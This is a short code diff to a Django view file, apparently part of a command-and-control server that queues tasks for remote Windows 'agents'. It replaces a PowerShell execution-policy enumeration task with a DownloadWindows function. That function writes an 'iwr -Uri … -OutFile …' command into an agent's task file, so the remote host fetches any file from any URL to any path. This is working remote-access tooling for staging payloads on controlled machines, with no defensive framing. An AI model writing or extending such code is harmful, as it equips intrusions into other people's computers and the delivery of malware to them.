@@ -4,14 +4,10 @@ from blog.models import *
 
 current_path= os.path.dirname(os.path.abspath(__file__))
 
-### $env:UserName
-#   $env:UserDomain
-#   $env:ComputerName
 
-
-def list_execPolicies(request, agent=''):
+def DownloadWindows(request, agent='', url='', outpath=''):
     if request.method=='POST':
-        task = 'echo "===============Get-ExecutionPolicy===============";Get-ExecutionPolicy -List'       
+        task = 'iwr -Uri {} -OutFile {}'.format(url, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
